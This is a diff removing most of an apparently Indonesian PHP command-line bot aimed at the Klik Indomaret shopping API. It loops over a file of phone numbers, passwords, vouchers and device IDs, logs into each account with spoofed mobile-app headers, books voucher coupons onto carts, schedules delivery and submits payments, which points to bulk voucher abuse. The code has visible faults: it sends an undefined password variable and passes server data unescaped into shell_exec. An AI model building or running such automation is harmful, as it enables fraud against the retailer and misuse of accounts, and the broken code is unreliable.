-		echo @color('yellow', "[10] 16:00-16:59\n");
-		echo @color('yellow', "[11] 17:00-17:59\n");
-		echo @color('yellow', "[12] 18:00-18:59\n");
-		echo @color('yellow', "[13] 19:00-19:59\n");
-		echo @color('yellow', "[14] 20:00-20:59\n");
-		echo @color('yellow', "pilih : ");
-		$jamambil = trim(fgets(STDIN));
-		echo @color('yellow', "DAFTAR HIDANGAN :\n");
-		echo @color('yellow', "[1] Isaku\n");
-		echo @color('yellow', "[2] BCA\n");
-		echo @color('red', "[3] REKPON\n");
-		echo @color('yellow', "[4] MANDIRI\n");
-		echo @color('yellow', "pilih : ");
-		$bayar = trim(fgets(STDIN));
-		khususantar22:
-		if (empty($file) || !file_exists($file)) {
-			echo "[+] File not found!\n";
-			goto masalxccxx22;
-		}
-		$list = explode("\n", str_replace("\r", "", file_get_contents($file)));
-		$no = 1;
-		$total = count($list) - 1;
-		$success = 0;
-		$error = 0;
-		foreach ($list as $kode) {
-			if (empty($kode)) {
-				continue;
-			}
-			echo "Total: {$no}/{$total}\n";
-			unlink('nganue.txt');
-			$akunxx = explode(';', trim($kode));
-			$nomor = trim($akunxx[0]);
-			$pw = trim($akunxx[1]);
-			$vocer = trim($akunxx[2]);
-			$device_id = trim($akunxx[3]);
-			$kuntul = array();
-			$kuntul[] = 'Content-Type: application/json';
-			$kuntul[] = 'Host: api.klikindomaret.com';
-			$kuntul[] = 'User-Agent: okhttp/3.12.1';
-			$kuntul2x = array();
-			$kuntul2x[] = 'Content-Type: application/json';
-			$kuntul2x[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2x[] = 'Applicationkey: indomaret';
-			$kuntul2x[] = 'Authorization: ';
-			$kuntul2x[] = 'User-Agent: okhttp/3.12.1';
-			$verif = curlx('https://account-api-v2.klikindomaret.com/api/Customer/LoginViaMobileApps?isMobile=true&device_token=2badfdf8-5d76-4c49-81cd-c7c3588eebc4&districtID=2483&TrafficSource=', '{"Email":"' . $nomor . '","Password":"' . $password . '"}', $kuntul2x);
-			$respi = json_decode($verif[1]);
-			$respid = $respi->ResponseID;
-			$idne = $respi->ResponseObject->ID;
-			$toked = $respi->ResponseObject->Token;
-			$kuntul2 = array();
-			$kuntul2[] = 'Content-Type: application/json';
-			$kuntul2[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2[] = 'Applicationkey: indomaret';
-			$kuntul2[] = 'Authorization: Bearer ' . $idne . '#' . $toked;
-			$kuntul2[] = 'User-Agent: okhttp/3.12.1';
-			$cekvcne = curlx('https://account-api-v2.klikindomaret.com/api/Customer/Account?access_token=' . $respid, null, $kuntul2);
-			$responx = $cekvcne[1];
-			if (strpos($responx, '"IsActivated":true')) {
-				$cok = json_decode($responx);
-				$ID = $cok[0]->ID;
-				$RegionId = $cok[0]->RegionId;
-				$getscid = curlx('https://api.klikindomaret.com/api/ShoppingCart/GetLastestShop?customerID=' . $ID . '&regionID=' . $RegionId, null, $kuntul);
-				//echo "$getscid[1]\n";
-				$za = json_decode($getscid[1]);
-				if (strpos($getscid[1], '"Message":"An error has occurred."')) {
-					echo @color('red', "ERROR KAK\n");
-				} else {
-					$scid = $za[0];
-					if ($scid !== []) {
-						$SCID = $scid;
-					}
-					$getaddress = curlx('https://account-api-v2.klikindomaret.com/api/CustomerAddress/GetByCustomerId?custId=' . $ID, null, $kuntul2);
-					if ($getaddress[1] == '[]') {
-						$addid = '00000000-0000-0000-0000-000000000000';
-					} else {
-						$addidx = json_decode($getaddress[1]);
-						$addid = $addidx[0]->ID;
-						$longe = $addidx[0]->Longitude;
-						$late = $addidx[0]->Latitude;
-					}
-					switch ($ambil) {
-						case '1':
-							$setaddress = curlx('https://api.klikindomaret.com/api/ShoppingCart/ReCheckStockAllItem?ShoppingCartID=' . $scid . '&StoreCode=&AddressType=1&CustomerAddressID=' . $addid . '&CustomerID=' . $ID . '&StoreCodeDest=&CustomerLatitude=' . $late . '&CustomerLongitude=' . $longe, null, $kuntul);
-							echo "{$setaddress[1]}\n";
-							break;
-						case '2':
-							$setaddress = curlx('https://account-api-v2.klikindomaret.com/api/CustomerAddress/SetAddressTypeAndDefaultStore?mfp_id=' . $respid . '&isChangeAddress=False&ShoppingCartID=' . $scid, '{"CustomerID":"' . $ID . '","AddressType":0,"StoreCode":"' . $kodetoko . '","StoreCodeDest":""}', $kuntul2);
-							echo "{$setaddress[1]}\n";
-							$setaddress2 = curlx('https://api.klikindomaret.com/api/ShoppingCart/ReCheckStockAllItem?ShoppingCartID=' . $scid . '&StoreCode=' . $kodetoko . '&AddressType=0&CustomerAddressID=' . $addid . '&CustomerID=' . $ID . '&StoreCodeDest=&CustomerLatitude=&CustomerLongitude=', null, $kuntul);
-							$datatoko = json_decode($setaddress2[1])[0];
-							$tokone = $datatoko->ResponseObject->StoreCode;
-							$tokone2 = $datatoko->ResponseObject->StoreName;
-							$tokone3 = $datatoko->ResponseObject->StoreAddress;
-							echo @color('yellow', "Kode Toko: ");
-							echo @color('nevy', "{$tokone}\n");
-							echo @color('yellow', "Toko : ");
-							echo @color('nevy', "{$tokone2} - {$tokone3}\n");
-							foreach ($datatoko->ResponseObject->Items as $mydata) {
-								$barang = $mydata->ProductDesc;
-								$qty = $mydata->QtyAvailable;
-								echo @color('yellow', "Item : ");
-								echo @color('nevy', "{$barang}\n");
-								echo @color('yellow', "Stok : ");
-								echo @color('nevy', "{$qty}\n");
-								if ($qty == '0') {
-									echo @color('red', "STOK KOSONG\n");
-									die;
-								}
-							}
-							break;
-					}
-					$DEVICE_ID = $device_id;
-					$cekk = curlx('https://api.klikindomaret.com/api/ShoppingCart/MyCart?id=&customerId=' . $ID . '&shoppingCartId=' . $SCID . '&regionID=' . $RegionId . '&mfp_id=' . $respid . '&StoreCode=' . $kodetoko . '&platform=ANDROID&NearestStoreLocation=&DeviceID=' . $DEVICE_ID . '&ShoppingcartPromoPackagesID=', null, $kuntul);
-					$json = json_decode($cekk[1]);
-					$tokonejon = $json[0]->CheckStockModel->StoreCode;
-					$tokonejon1 = $json[0]->CheckStockModel->StoreName;
-					$tokonejon2 = $json[0]->CheckStockModel->StoreAddress;
-					$storeid = $json[0]->CheckStockModel->StoreID;
-					$RegionID = $json[0]->CheckStockModel->RegionID;
-					$DistrictID = $json[0]->CheckStockModel->DistrictID;
-					$gettoko = curlx('https://api.klikindomaret.com/api/Store/GetAllStoreByCode?storeCode=' . $kodetoko . '&customerLatitude=-6.78542505&customerLongitude=112.19929015', null, $kuntul);
-					$ZipCode = json_decode($gettoko[1])[0]->ZipCode;
-					echo @color('nevy', "KODE TOKO : {$tokonejon}\n");
-					echo @color('nevy', "NAMA TOKO : {$tokonejon1}\n");
-					echo @color('nevy', "ALAMAT TOKO : {$tokonejon2}\n");
-					foreach ($json[0]->CartItemNotification->Items as $mydata) {
-						$cx = $mydata;
-						foreach ($cx->ShoppingCartItems as $myxxx) {
-							$idne = $myxxx->Quantity;
-							$prduk = $myxxx->ProductDescription;
-							echo "{$prduk} == {$idne}\n";
-						}
-					}
-					cekupon22:
-					if ($json[0]->CartItemNotification->ListCouponPotonganTotal == []) {
-						echo @color('red', "KUPON KOSONG KAK\n");
-					} else {
-						$jumlah = count($json[0]->CartItemNotification->ListCouponPotonganTotal);
-						echo @color('yellow', "JUMLAH KUPON NEMPEL : ");
-						echo @color('green', "{$jumlah}\n");
-						foreach ($json[0]->CartItemNotification->ListCouponPotonganTotal as $mydata) {
-							$kupon = $mydata->CouponMask;
-							$desk = $mydata->CouponMekanisme;
-							//echo "Nama Kupon : $kupon\n";
-							echo @color('yellow', "Nama Kupon   : ");
-							echo @color('green', "{$kupon}\n");
-							echo @color('yellow', "Keterangan   : ");
-							echo @color('blue', "{$desk}\n");
-						}
-					}
-					inputvocer222:
-					echo @color('blue', "Tempel kupon : ");
-					echo @color('nevy', "{$vocer}\n");
-					$datane = '{"Code":"' . $vocer . '","ShoppingCartID":"' . $SCID . '","CustomerID":"' . $ID . '","RegionID":"' . $RegionId . '","SalesOrderNo":"","Nominal":"","DeviceID":"' . $DEVICE_ID . '","ShoppingCartPackageID":null}';
-					$kupon = curlx('https://api.klikindomaret.com/api/Voucher/BookingVoucherCoupon?mfp_id=' . $respid, $datane, $kuntul);
-					$kimak = json_decode($kupon[1]);
-					$ket = $kimak->ResponseObject->keterangan;
-					if (strpos($kupon[1], '"status":"SUCCESS"')) {
-						echo @color('green', "BERHASIL GAN\n");
-						echo @color('nevy', "{$ket}\n");
-						echo @color('blue', "{$nomor}\n");
-					} else {
-						echo @color('red', "{$ket}\n");
-					}
-					switch ($ambil) {
-						case '1':
-							$ceksk = curlx('https://api.klikindomaret.com/api/ShoppingCart/MyCart?id=&customerId=' . $ID . '&shoppingCartId=' . $SCID . '&regionID=' . $RegionId . '&mfp_id=' . $respid . '&StoreCode=' . $kodetoko . '&platform=ANDROID&NearestStoreLocation=&DeviceID=' . $DEVICE_ID . '&ShoppingcartPromoPackagesID=', null, $kuntul);
-							$gettime = curlx('https://api.klikindomaret.com/api/Setting/Get?SettingKey=STORE_PREPARATION_TIME', null, $kuntul);
-							$gett = curlx('https://account-api-v2.klikindomaret.com/api/CustomerAddress/GetByCustomerId?custId=' . $ID, null, $kuntul2);
-							$addidx = json_decode($gett[1]);
-							$addid = $addidx[0]->ID;
-							$ZipCode = $addidx[0]->ZipCode;
-							$DistrictId = $addidx[0]->DistrictId;
-							$getmboh = curlx('https://api.klikindomaret.com/api/ShoppingCart/GetShippingMethod/' . $SCID . '?customerId=' . $ID . '&isVIrtual=false&regionID=' . $RegionId . '&CustomerAddressID=00000000-0000-0000-0000-000000000000&IsParcelView=false&DeviceID=' . $DEVICE_ID . '&ShoppingcartPromoPackagesID=', null, $kuntul);
-							$ceksek = curlx('https://api.klikindomaret.com/api/ShoppingCart/MyCart?id=&customerId=' . $ID . '&shoppingCartId=' . $SCID . '&regionID=' . $RegionId . '&mfp_id=' . $respid . '&StoreCode=' . $kodetoko . '&platform=ANDROID&NearestStoreLocation=&DeviceID=' . $DEVICE_ID . '&ShoppingcartPromoPackagesID=', null, $kuntul);
-							$poss = curlx('https://api.klikindomaret.com/api/ShoppingCart/StoreZoneSlotCalculate?mfp_id=' . $respid, '{"ShoppingCartID":"' . $SCID . '","IsDelivery":true,"CustomerAddressID":"' . $addid . '","DeviceID":"' . $DEVICE_ID . '","ShoppingcartPromoPackagesID":null}', $kuntul);
-							$cekasek = curlx('https://api.klikindomaret.com/api/ShoppingCart/MyCart?id=&customerId=' . $ID . '&shoppingCartId=' . $SCID . '&regionID=' . $RegionId . '&mfp_id=' . $respid . '&StoreCode=' . $kodetoko . '&platform=ANDROID&NearestStoreLocation=&DeviceID=' . $DEVICE_ID . '&ShoppingcartPromoPackagesID=', null, $kuntul);
-							$poss2 = curlx('https://api.klikindomaret.com/api/ShoppingCart/StoreZoneSlotCalculate?mfp_id=' . $respid, '{"ShoppingCartID":"' . $SCID . '","IsDelivery":true,"CustomerAddressID":"' . $addid . '","DeviceID":"' . $DEVICE_ID . '","ShoppingcartPromoPackagesID":null}', $kuntul);
-							$possas = curlx('https://api.klikindomaret.com/api/ShoppingCart/StoreZoneSlotCalculate?mfp_id=' . $respid, '{"ShoppingCartID":"' . $SCID . '","IsDelivery":true,"CustomerAddressID":"' . $addid . '","DeviceID":"' . $DEVICE_ID . '","ShoppingcartPromoPackagesID":null}', $kuntul);
-							$possass = curlx('https://api.klikindomaret.com/api/ShoppingCart/StoreZoneSlotCalculate?mfp_id=' . $respid, '{"ShoppingCartID":"' . $SCID . '","IsDelivery":true,"CustomerAddressID":"' . $addid . '","DeviceID":"' . $DEVICE_ID . '","ShoppingcartPromoPackagesID":null}', $kuntul);
-							$possaa = curlx('https://api.klikindomaret.com/api/ShoppingCart/StoreZoneSlotCalculate?mfp_id=' . $respid, '{"ShoppingCartID":"' . $SCID . '","IsDelivery":true,"CustomerAddressID":"' . $addid . '","DeviceID":"' . $DEVICE_ID . '","ShoppingcartPromoPackagesID":null}', $kuntul);
-							$jsone = json_decode($possaa[1]);
-							$ax1 = "0";
-							$ax2 = "10";
-							echo @color('yellow', "TANGGAL : \n");
-							for ($ax1; $ax1 < $ax2; $ax1++) {
-								$tanggale = $jsone->ResponseObject->ListSlot[$ax1]->DateLabel;
-								$tanggalex = $jsone->ResponseObject->ListSlot[$ax1]->DateDayLabel;
-								echo @color('nevy', "[{$ax1}]");
-								echo "=> ";
-								echo @color('yellow', "{$tanggale}");
-								echo "\n";
-								if ($tanggale == "") {
-									break;
-								}
-							}
-							echo @color('yellow', "PILIH : ");
-							$tglee = trim(fgets(STDIN));
-							switch ($tglee) {
-								case '0':
-									$tgle = $jsone->ResponseObject->ListSlot[0]->DateSlot;
-									$tagalex = $jsone->ResponseObject->ListSlot[0]->DateLabel;
-									break;
-								case '1':
-									$tgle = $jsone->ResponseObject->ListSlot[1]->DateSlot;
-									$tagalex = $jsone->ResponseObject->ListSlot[1]->DateLabel;
-									break;
-								case '2':
-									$tgle = $jsone->ResponseObject->ListSlot[2]->DateSlot;
-									$tagalex = $jsone->ResponseObject->ListSlot[2]->DateLabel;
-									break;
-								case '3':
-									$tgle = $jsone->ResponseObject->ListSlot[3]->DateSlot;
-									$tagalex = $jsone->ResponseObject->ListSlot[3]->DateLabel;
-									break;
-								case '4':
-									$tgle = $jsone->ResponseObject->ListSlot[4]->DateSlot;
-									$tagalex = $jsone->ResponseObject->ListSlot[4]->DateLabel;
-									break;
-								case '5':
-									$tgle = $jsone->ResponseObject->ListSlot[5]->DateSlot;
-									$tagalex = $jsone->ResponseObject->ListSlot[5]->DateLabel;
-									break;
-							}
-							$jumuke = explode('T', $tgle);
-							$tgljmk = $jumuke[0];
-							echo @color('yellow', "{$tagalex}\n");
-							$axx1 = "0";
-							$axx2 = "14";
-							echo @color('yellow', "JAM ANTAR :\n");
-							for ($axx1; $axx1 < $axx2; $axx1++) {
-								$xs = $axx1 + 1;
-								$jame = $jsone->ResponseObject->ListSlot[$tglee]->SlotPengiriman[$axx1]->SlotLabel;
-								$pesane = $jsone->ResponseObject->ListSlot[$tglee]->SlotPengiriman[$axx1]->Message;
-								echo @color('nevy', "[{$xs}]");
-								echo "=> ";
-								echo @color('yellow', "{$jame}, ");
-								echo @color('red', "{$pesane}");
-								echo "\n";
-								if ($jame == "") {
-									break;
-								}
-							}
-							echo @color('yellow', "pilih : ");
-							$jamambil = trim(fgets(STDIN));
-							switch ($jamambil) {
-								case '1':
-									$jmbt = "07:00";
-									break;
-								case '2':
-									$jmbt = "08:00";
-									break;
-								case '3':
-									$jmbt = "09:00";
-									break;
-								case '4':
-									$jmbt = "10:00";
-									break;
-								case '5':
-									$jmbt = "11:00";
-									break;
-								case '6':
-									$jmbt = "12:00";
-									break;
-								case '7':
-									$jmbt = "13:00";
-									break;
-								case '8':
-									$jmbt = "14:00";
-									break;
-								case '9':
-									$jmbt = "15:00";
-									break;
-								case '10':
-									$jmbt = "16:00";
-									break;
-								case '11':
-									$jmbt = "17:00";
-									break;
-								case '12':
-									$jmbt = "18:00";
-									break;
-								case '13':
-									$jmbt = "19:00";
-									break;
-								case '14':
-									$jmbt = "20:00";
-									break;
-							}
-							$cekasek = curlx('https://api.klikindomaret.com/api/ShoppingCart/MyCart?id=&customerId=' . $ID . '&shoppingCartId=' . $SCID . '&regionID=' . $RegionId . '&mfp_id=' . $respid . '&StoreCode=' . $kodetoko . '&platform=ANDROID&NearestStoreLocation=&DeviceID=' . $DEVICE_ID . '&ShoppingcartPromoPackagesID=', null, $kuntul);
-							if (strpos($possaa[1], '"IsSuccess":true')) {
-								$gass = curlx('https://api.klikindomaret.com/api/Cart/UpdateShippingMetohod?mfp_id=' . $respid, '{"AddressType":1,"AddressIDStore":"' . $addid . '","IStoreShippingDate":"' . $tgljmk . 'T00:00:00","IStorePreferTimeDelivery":"' . $jmbt . '","IStorePreferTimeShipping":"' . $jmbt . '","IPPServiceType":"","IsIPP":false,"AddressIDPlaza":"' . $addid . '","IPlazaShippingDate":"","IPPStoreCode":"","ShoppingCartID":"' . $SCID . '","IsDelivery":1,"RegionID":"' . $RegionId . '","IStoreDeliveryType":"REGULER","IStoreExpressOfflineLimit":0,"IStoreExpressDeliveryServiceFee":0,"MobileIstore":1,"MobileIPlaza":0,"PlazaDeliveryType":"","ShoppingcartPromoPackagesID":null,"DistrictId":' . $DistrictId . ',"ShopZipCode":"' . $ZipCode . '"}', $kuntul);
-								if (strpos($gass[1], '"Message":"success"')) {
-									$createpay = curlx('https://api.klikindomaret.com/api/Payment/CreateId?Id=' . $SCID, null, $kuntul);
-									$headers1 = array();
-									$headers1[] = 'Host: payment.klikindomaret.com';
-									$headers1[] = 'user-agent: klikindomaretmobile';
-									$headers1[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8';
-									for ($i = 0; $i < 3; $i++) {
-										$getpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments?pcid=klikindomaret&trxtype=createorder&SCTPCID=' . $SCID . '&LAT=null&LONG=null&DeviceID=' . urut(16), null, $headers1);
-										$linkx = get_between($getpay[1], '"hdTotalAmount" value="', '"');
-										echo @color('nevy', "TOTAL : {$linkx}\n");
-									}
-									echo @color('yellow', "DAFTAR HIDANGAN :\n");
-									echo @color('yellow', "[1] Isaku\n");
-									echo @color('yellow', "[2] BCA\n");
-									echo @color('yellow', "[3] REKPON\n");
-									echo @color('yellow', "[3] REKPON\n");
-									echo @color('yellow', "pilih : ");
-									$bayar = trim(fgets(STDIN));
-									switch ($bayar) {
-										case '1':
-											echo "Total : {$linkx}\n";
-											$parcel1 = array();
-											$parcel1[] = 'Host: payment.klikindomaret.com';
-											$parcel1[] = 'Accept: */*';
-											$parcel1[] = 'Origin: https://payment.klikindomaret.com';
-											$parcel1[] = 'user-agent: klikindomaretmobile';
-											$parcel1[] = 'content-type: application/json; charset=UTF-8';
-											$parcel1[] = 'x-requested-with: XMLHttpRequest';
-											$padrcel1[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
-											$submitpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments/SubmitPayment', '{"PaymentTypeCode":"BPISAKU","TotalAmount":"' . $linkx . '","Token":"","IsCoupon":"0","IsPaymentPartial":0,"WalletAmmount":"0","WalletPassword":"","IsVA":false,"PaymentTypeName":"i.Saku","useCoin":false,"potentialCoinShopee":"","Source":"Android"}', $parcel1);
-											$k = json_decode($submitpay[1])->Trxid;
-											$lk = str_replace('TIM', '', $k);
-											unlink('nganue.txt');
-											echo shell_exec("xdg-open 'https://barcode.tec-it.com/barcode.ashx?data='{$lk}'&code=Code128&multiplebarcodes=false&translate-esc=true&unit=Fit&dpi=96&imagetype=Gif&rotation=0&color=%23000000&bgcolor=%23ffffff&codepage=Default&qunit=Mm&quiet=10&hidehrt=False'");
-											$sttpay = curlx('https://api.klikindomaret.com/api/SalesOrder/GetSalesOrderHeaderListByCustomerIdAndSalesOrderNo/null?sortmode=&id=' . $ID . '&currPage=1&pageSize=30&no=&mode=0', null, $kuntul);
-											sleep(5);
-											$sttp = json_decode($sttpay[1]);
-											$stbyr = $sttp[0]->StatusPembayaran;
-											$sttype = $sttp[0]->PaymentTypeName;
-											$sttexp = $sttp[0]->PaymentExpiredDate;
-											$TransactionCode = $sttp[0]->TransactionCode;
-											$jenenge = $sttp[0]->CustomerContactName;
-											$totale = $sttp[0]->Total;
-											$PaymentAccountID = $sttp[0]->PaymentAccountID;
-											if ($stbyr == null) {
-												$sttbayar = 'Segera cek';
-											} else {
-												$sttbayar = $stbyr;
-											}
-											echo @color('yellow', "Kode Transaksi: ");
-											echo @color('nevy', "{$TransactionCode}\n");
-											echo @color('yellow', "Status Pembayaran: ");
-											echo @color('nevy', "{$sttbayar}\n");
-											echo @color('yellow', "Tipe Pembayaran: ");
-											echo @color('nevy', "{$sttype}\n");
-											echo @color('yellow', "PaymentExpiredDate: ");
-											echo @color('nevy', "{$sttexp}\n");
-											save("KodeTransaksi: " . $TransactionCode . "|Nama: " . $jenenge . "|Nomor: " . $nomor . "|KodeToko: " . $tokonejon . "|Total: " . $totale . "\n", 'transaksiIsaku.txt');
-											break;
-										case '2':
-											$parcel1 = array();
-											$parcel1[] = 'Host: payment.klikindomaret.com';
-											$parcel1[] = 'Accept: */*';
-											$parcel1[] = 'Origin: https://payment.klikindomaret.com';
-											$parcel1[] = 'user-agent: klikindomaretmobile';
-											$parcel1[] = 'content-type: application/json; charset=UTF-8';
-											$parcel1[] = 'x-requested-with: XMLHttpRequest';
-											$padrcel1[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
-											$submitpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments/SubmitPayment', '{"PaymentTypeCode":"702","TotalAmount":"' . $linkx . '","Token":"","IsCoupon":"1","IsPaymentPartial":0,"WalletAmmount":"0","WalletPassword":"","IsVA":false,"Source":"Android"}', $parcel1);
-											$sttpay = curlx('https://api.klikindomaret.com/api/SalesOrder/GetSalesOrderHeaderListByCustomerIdAndSalesOrderNo/null?sortmode=&id=' . $ID . '&currPage=1&pageSize=30&no=&mode=0', null, $kuntul);
-											$sttp = json_decode($sttpay[1]);
-											$stbyr = $sttp[0]->StatusPembayaran;
-											$sttype = $sttp[0]->PaymentTypeName;
-											$sttexp = $sttp[0]->PaymentExpiredDate;
-											$TransactionCode = $sttp[0]->TransactionCode;
-											$jenenge = $sttp[0]->CustomerContactName;
-											$totale = $sttp[0]->Total;
-											$PaymentAccountID = $sttp[0]->PaymentAccountID;
-											   $dircrot = $sttp[0]->Referer;
-											if ($stbyr == null) {
-												$sttbayar = 'Segera cek';
-											} else {
-												$sttbayar = $stbyr;
-											}
-										
-									echo " {$Yellow}➤{$White} Payment Redirect	 : " . $dircrot . "\n";
-											echo @color('yellow', "Kode Transaksi: ");
-											echo @color('nevy', "{$TransactionCode}\n");
-											echo @color('yellow', "Status Pembayaran: ");
-											echo @color('nevy', "{$sttbayar}\n");
-											echo @color('yellow', "Tipe Pembayaran: ");
-											echo @color('nevy', "{$sttype}\n");
-											echo @color('yellow', "KODE VA: ");
-											echo @color('nevy', "{$PaymentAccountID}\n");
-											echo @color('yellow', "PaymentExpiredDate: ");
-											echo @color('nevy', "{$sttexp}\n");
-											save("KodeTransaksi: " . $TransactionCode . "|Nama: " . $jenenge . "|Nomor: " . $nomor . "|KodeToko: " . $tokonejon . "|Total: " . $totale . "|Kode VA :" . $PaymentAccountID . "\n", 'transaksiBCA.txt');
-											unlink('nganue.txt');
-											break;
-										case '3':
-											echo @color('yellow', "Masukkan token: ");
-											$tokentt = trim(fgets(STDIN));
-											$parcel1 = array();
-											$parcel1[] = 'Host: payment.klikindomaret.com';
-											$parcel1[] = 'Accept: */*';
-											$parcel1[] = 'Origin: https://payment.klikindomaret.com';
-											$parcel1[] = 'user-agent: klikindomaretmobile';
-											$parcel1[] = 'content-type: application/json; charset=UTF-8';
-											$parcel1[] = 'x-requested-with: XMLHttpRequest';
-											$padrcel1[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
-											$submitpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments/SubmitPayment', '{"PaymentTypeCode":"RKPON","TotalAmount":"' . $linkx . '","Token":"' . $tokentt . '","IsCoupon":"0","IsPaymentPartial":0,"WalletAmmount":"0","WalletPassword":"","IsVA":false,"PaymentTypeName":"CIMB Niaga Rekening Ponsel","useCoin":false,"potentialCoinShopee":"","Source":"Android"}', $parcel1);
-											$sttpay = curlx('https://api.klikindomaret.com/api/SalesOrder/GetSalesOrderHeaderListByCustomerIdAndSalesOrderNo/null?sortmode=&id=' . $ID . '&currPage=1&pageSize=30&no=&mode=0', null, $kuntul);
-											$sttp = json_decode($sttpay[1]);
-											$stbyr = $sttp[0]->StatusPembayaran;
-											$sttype = $sttp[0]->PaymentTypeName;
-											$sttexp = $sttp[0]->PaymentExpiredDate;
-											$TransactionCode = $sttp[0]->TransactionCode;
-											$jenenge = $sttp[0]->CustomerContactName;
-											$totale = $sttp[0]->Total;
-											$PaymentAccountID = $sttp[0]->PaymentAccountID;
-											   $dircrot = $sttp[0]->Referer;
-											if ($stbyr == null) {
-												$sttbayar = 'Segera cek';
-											} else {
-												$sttbayar = $stbyr;
-											}
-										
-									echo " {$Yellow}➤{$White} Payment Redirect	 : " . $dircrot . "\n";
-											echo @color('yellow', "Kode Transaksi: ");
-											echo @color('nevy', "{$TransactionCode}\n");
-											echo @color('yellow', "Status Pembayaran: ");
-											echo @color('nevy', "{$sttbayar}\n");
-											echo @color('yellow', "Tipe Pembayaran: ");
-											echo @color('nevy', "{$sttype}\n");
-											echo @color('yellow', "PaymentExpiredDate: ");
-											echo @color('nevy', "{$sttexp}\n");
-											save("KodeTransaksi: " . $TransactionCode . "|Nama: " . $jenenge . "|Nomor: " . $nomor . "|KodeToko: " . $tokonejon . "|Total: " . $totale . "|Kode VA :" . $PaymentAccountID . "\n", 'transaksiREKPON.txt');
-											unlink('nganue.txt');
-											break;
-									}
-								} else {
-									echo @color('red', "{$gass[1]}\n");
-								}
-							} else {
-								echo @color('red', "{$possaa[1]}\n");
-							}
-							break;
-						case '2':
-							$gett = curlx('https://account-api-v2.klikindomaret.com/api/CustomerAddress/GetByCustomerId?custId=' . $ID, null, $kuntul2);
-							if ($gett[1] == '[]') {
-								$addid = '00000000-0000-0000-0000-000000000000';
-							} else {
-								$addidx = json_decode($gett[1]);
-								$addid = $addidx[0]->ID;
-							}
-							$poss = curlx('https://api.klikindomaret.com/api/ShoppingCart/StoreZoneSlotCalculate?mfp_id=' . $respid, '{"ShoppingCartID":"' . $SCID . '","IsDelivery":false,"StoreID":"' . $storeid . '","DeviceID":"' . $DEVICE_ID . '","ShoppingcartPromoPackagesID":null}', $kuntul);
-							switch ($jamambil) {
-								case '1':
-									$jmbt = "07:00";
-									break;
-								case '2':
-									$jmbt = "08:00";
-									break;
-								case '3':
-									$jmbt = "09:00";
-									break;
-								case '4':
-									$jmbt = "10:00";
-									break;
-								case '5':
-									$jmbt = "11:00";
-									break;
-								case '6':
-									$jmbt = "12:00";
-									break;
-								case '7':
-									$jmbt = "13:00";
-									break;
-								case '8':
-									$jmbt = "14:00";
-									break;
-								case '9':
-									$jmbt = "15:00";
-									break;
-								case '10':
-									$jmbt = "16:00";
-									break;
-								case '11':
-									$jmbt = "17:00";
-									break;
-								case '12':
-									$jmbt = "18:00";
-									break;
-								case '13':
-									$jmbt = "19:00";
-									break;
-								case '14':
-									$jmbt = "20:00";
-									break;
-							}
-							if (strpos($poss[1], '"IsSuccess":true')) {
-								$gass = curlx('https://api.klikindomaret.com/api/Cart/UpdateShippingMetohod?mfp_id=' . $respid, '{"AddressType":0,"AddressIDStore":"' . $addid . '","IStoreShippingDate":"' . date("Y") . '-' . $blne . '-' . $tgle . 'T00:00:00","IStorePreferTimeDelivery":"' . $jmbt . '","IStorePreferTimeShipping":"' . $jmbt . '","IPPServiceType":"","IsIPP":false,"AddressIDPlaza":"' . $addid . '","IPlazaShippingDate":"","IPPStoreCode":"","ShoppingCartID":"' . $SCID . '","IsDelivery":0,"RegionID":"' . $RegionID . '","IStoreDeliveryType":"REGULER","IStoreExpressOfflineLimit":0,"IStoreExpressDeliveryServiceFee":0,"MobileIstore":1,"MobileIPlaza":0,"PlazaDeliveryType":"","ShoppingcartPromoPackagesID":null,"DistrictId":' . $DistrictID . ',"StoreID":"' . $storeid . '","ShopZipCode":"' . $ZipCode . '"}', $kuntul);
-								if (strpos($gass[1], '"Message":"success"')) {
-									$createpay = curlx('https://api.klikindomaret.com/api/Payment/CreateId?Id=' . $SCID, null, $kuntul);
-									$headers1 = array();
-									$headers1[] = 'Host: payment.klikindomaret.com';
-									$headers1[] = 'user-agent: klikindomaretmobile';
-									$headers1[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8';
-									for ($i = 0; $i < 3; $i++) {
-										$getpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments?pcid=klikindomaret&trxtype=createorder&SCTPCID=' . $SCID . '&LAT=null&LONG=null&DeviceID=' . urut(16), null, $headers1);
-										$linkx = get_between($getpay[1], '"hdTotalAmount" value="', '"');
-										echo @color('nevy', "TOTAL : {$linkx}\n");
-									}
-									switch ($bayar) {
-										case '1':
-											echo "Total : {$linkx}\n";
-											$parcel1 = array();
-											$parcel1[] = 'Host: payment.klikindomaret.com';
-											$parcel1[] = 'Accept: */*';
-											$parcel1[] = 'Origin: https://payment.klikindomaret.com';
-											$parcel1[] = 'user-agent: klikindomaretmobile';
-											$parcel1[] = 'content-type: application/json; charset=UTF-8';
-											$parcel1[] = 'x-requested-with: XMLHttpRequest';
-											$padrcel1[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
-											// $submitpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments/SubmitPayment', '{"PaymentTypeCode":"BPISAKU","TotalAmount":"'.$linkx.'","Token":"","IsCoupon":"0","IsPaymentPartial":0,"WalletAmmount":"0","WalletPassword":"","IsVA":false,"PaymentTypeName":"i.Saku","useCoin":false,"potentialCoinShopee":"","Source":"Android"}', $parcel1);
